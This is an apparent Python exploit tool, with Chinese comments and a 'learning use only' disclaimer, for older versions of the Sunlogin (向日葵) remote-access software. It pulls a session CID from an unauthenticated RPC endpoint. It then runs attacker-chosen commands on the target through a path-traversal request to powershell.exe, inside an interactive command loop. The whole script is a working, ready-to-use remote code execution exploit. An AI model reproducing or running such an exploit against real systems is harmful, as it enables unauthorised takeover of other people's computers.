# -*- encoding: utf-8 -*-
# Time : 2022/02/17 10:23:36
# Author: crow



import requests
import re 

def title():
    print('+------------------------------------------')
    print('[+]  \033[34mGithub : https://github.com/crow821/                        \033[0m')
    print('[+]  \033[34m公众号 :  乌鸦安全                                            \033[0m')
    print('[+]  \033[34m功  能:  低版本向日葵漏洞利用工具(烂,但又不是不能用)                              \033[0m')
    print('[+]  \033[34m说  明:  本工具仅供学习使用，禁止用于非法攻击测试，请遵守网络安全法规  \033[0m')
    print('[+]  \033[34m说  明:  本工具不带端口扫描功能(主要是太费劲了。。。。)              \033[0m')
    print('[+]  \033[36m使用格式:  python3 xrk_exp.py                                \033[0m')
    print('[+]  \033[36minfo: please input your ip:port                              \033[0m')
    print('[+]  \033[36minfo: for example: 127.0.0.1:45321                           \033[0m')
    print('+------------------------------------------')

def get_CID(host):

    cid_exp = '/cgi-bin/rpc?action=verify-haras'
    cid_url = host + cid_exp
    try:
        res_cid = requests.get(cid_url).text
        if 'verify_string' in res_cid:
            print('\033[36m[+] bingo,find vuln !!!\033[0m')
            cid = re.findall('"verify_string":"(.*?)",', res_cid)[0]
            print('\033[36m[+] cid:\033[0m',cid)
            return cid
        else:
            print("[-] the current ip not exist vuln")
    except Exception as e:
        print('[-] error')
    


def get_exp(host, cid, command):
    exp_payload = "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20" + command
    exp_url = host + exp_payload
    data = {

        'Host': host,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': 'CID=' + cid,
        'Cache-Control': 'max-age=0'
    }
    res = requests.get(exp_url, headers=data, timeout=10)
    print(res.text)

if __name__ == "__main__":
    title()
    host = 'http://' + str(input('[+] host: ' ))
    try:
        cid = get_CID(host)
        if cid != []:
            print('\033[34m[+] info: please input your command\033[0m')
            print('\033[34m[+] info: for example: whoami\033[0m')
            while True:
                command = str(input('\033[36m[+] command(q is quit): \033[0m'))
                if command != 'q':
                    get_exp(host, cid, command)
                else:
                    break
    except:
        pass

